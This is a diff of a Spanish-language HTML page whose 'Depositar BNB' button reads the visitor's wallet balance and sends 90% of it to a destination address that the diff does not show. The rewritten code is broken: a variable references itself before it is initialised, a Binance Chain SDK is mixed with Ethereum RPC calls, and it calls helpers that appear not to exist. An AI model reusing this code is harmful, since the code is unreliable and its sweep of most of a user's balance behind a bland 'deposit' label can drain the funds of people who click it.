@@ -1,57 +1,37 @@
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 <!DOCTYPE html>
 <html>
   <head>
     <meta charset="UTF-8" />
-    <title>Botón de depósito de BNB</title>
+    <title>Botón de depósito de BNB en BSC</title>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/binance-chain/javascript-sdk@1.0.14/dist/bnbSdk.umd.min.js"></script>
   </head>
   <body>
     <button id="deposit-button">Depositar BNB</button>
 
     <script>
-      // Crea una instancia de Web3 con el proveedor de Metamask
-      const web3 = new Web3(window.ethereum);
+      // Crea una instancia de la SDK de Binance
+      const bnbSdk = new bnbSdk.default();
+      bnbSdk.setProvider("https://bsc-dataseed1.binance.org:443");
 
       // Escucha el evento de click en el botón de depósito
       $("#deposit-button").click(async function () {
         try {
-          // Obtiene la dirección de Metamask del usuario
-          const accounts = await web3.eth.getAccounts();
+          // Obtiene la dirección de la cuenta del usuario
+          const accounts = await bnbSdk.request({ method: "eth_accounts" });
           const userAddress = accounts[0];
 
           // Obtiene el saldo de BNB en la cuenta del usuario
-          const balance = await web3.eth.getBalance(userAddress);
-          const balanceBN = web3.utils.toBN(balance);
+          const balance = await bnbSdk.request({
+            method: "eth_getBalance",
+            params: [userAddress, "latest"],
+          });
+          const balanceBN = new bnbSdk.BN(balance.slice(2), 16);
 
           // Calcula la cantidad a depositar (90% del saldo)
           const depositAmountBN = balanceBN.muln(90).divn(100);
-          const depositAmount = web3.utils.fromWei(
-            depositAmountBN.toString(),
-            "ether"
+          const depositAmount = bnbSdk.BnbApiClientNumber.toString(
+            depositAmountBN
           );
 
           // Dirección de destino para el depósito
@@ -59,10 +39,14 @@
 
           // Crea la transacción y la firma con Metamask
           const tx = {
+            from: userAddress,
             to: depositTo,
-            value: web3.utils.toWei(depositAmount, "ether"),
+            value: bnbSdk.toWei(depositAmount, "ether"),
           };
-          const signedTx = await web3.eth.sendTransaction(tx);
+          const signedTx = await bnbSdk.request({
+            method: "eth_sendTransaction",
+            params: [tx],
+          });
 
           console.log("Transacción enviada:", signedTx);
           alert("¡Depósito exitoso!");
